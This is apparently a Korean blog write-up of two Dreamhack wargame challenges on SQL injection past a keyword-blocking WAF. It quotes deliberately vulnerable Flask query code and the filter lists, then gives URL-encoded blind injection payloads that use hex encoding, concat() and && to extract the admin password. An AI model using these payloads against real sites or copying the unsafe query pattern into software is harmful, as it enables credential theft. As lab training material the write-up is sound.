---
title: "[Dreamhack] sql injection bypass WAF"
tags:
    - SQL
    - Injection
date: "2024-08-07"
thumbnail: "/assets/sql_injection_bypass_WAF/문제.png"
---

# Intro
---
[Dreamhack][Dreamhack]의 WarGame 中 [sql injection bypass WAF][sql injection bypass WAF]문제와 [sql injection bypass WAF Advanced][sql injection bypass WAF Advanced]문제에 대한 **Write-up**을 작성하고자 한다.

# Analysis - sql injection bypass WAF
---
폼(uid)에 입력한 값이 SQL 쿼리문의 일부로 사용되어 그 결과가 응답값에 보여진다.
![사이트](/assets/sql_injection_bypass_WAF/01_analysis_1.png){: style="border: 1px solid;"}

아래의 코드는 해당 문제의 코드 일부를 발췌한 것으로, **SQL Injection 공격**을 통해 admin 계정의 패스워드(FLAG)를 획득하는 것이 목표이다. 파라미터(uid)값을 입력받아 keywords 배열 내 문자열에 대하여 필터링을 수행하는데, 이를 우회하는 것이 문제의 쟁점이다.
```python
keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data:
            return True
            
uid = request.args.get('uid')
if uid:
    if check_WAF(uid):
        return 'your request has been blocked by WAF.'
    cur = mysql.connection.cursor()
    cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
```
<br>

```sql
USE `users`;
CREATE TABLE user(
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO user(uid, upw) values('abcde', '12345');
INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
```

# Exploit - sql injection bypass WAF
---
- `대/소문자` 구분을 이용한 문자열 필터링 우회 : union, select > UNION, SELECT
- `공백` 우회 : 공백 > TAB

![FLAG](/assets/sql_injection_bypass_WAF/01_exploit_1.png){: style="border: 1px solid;"}
<br><br>

# Analysis - sql injection bypass WAF Advanced
---
해당 문제는 위의 문제와 유사하지만, 필터링하는 문자열 종류과 대/소문자를 구분하지 않고 필터링을 수행한다는 점에 차이가 있다.
~~~python
keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', '\n', '\r', '\t', '\x0b', '\x0c', '-', '+']

def check_WAF(data):
    for keyword in keywords:
        if keyword in data.lower():
            return True
~~~

# Exploit - sql injection bypass WAF Advanced
---
- `Hex Encoding` 또는 `concat()` 함수를 이용한 문자열 필터링 우회 : admin > 0x61646D696E, concat('adm','in')
- `논리연산자` 이용 : and > &&

파라미터(uid) 값에 삽입한 조작 쿼리는 uid가 **admin**이고 upw(FLAG)의 첫 번째 글자가 **D**이면 응답값에 **admin**이 반환되고, upw(FLAG)의 첫 번째 글자가 **D**가 아니면 응답값에 어떠한 값도 반환되지 않는다. 이러한 참/거짓 쿼리의 반환값 차이(admin)를 이용하여 FLAG를 획득한다.

```plainText
1) Hex Encoding: '||uid=0x61646D696E%26%26(substring(upw,1,1)='D')%26%261=1;%23
2) concat(): '||uid=concat('adm','in')%26%26(substring(upw,1,1)='D')%26%261=1;%23
```

1) Hex Encoding 및 논리연산자 이용
![FLAG](/assets/sql_injection_bypass_WAF/02_exploit_1.png){: style="border: 1px solid;"}

2) concat() 함수 및 논리연산자 이용
![FLAG](/assets/sql_injection_bypass_WAF/02_exploit_2.png){: style="border: 1px solid;"}



[Dreamhack]:https://dreamhack.io/
[sql injection bypass WAF]:https://dreamhack.io/wargame/challenges/415
[sql injection bypass WAF Advanced]:https://dreamhack.io/wargame/challenges/416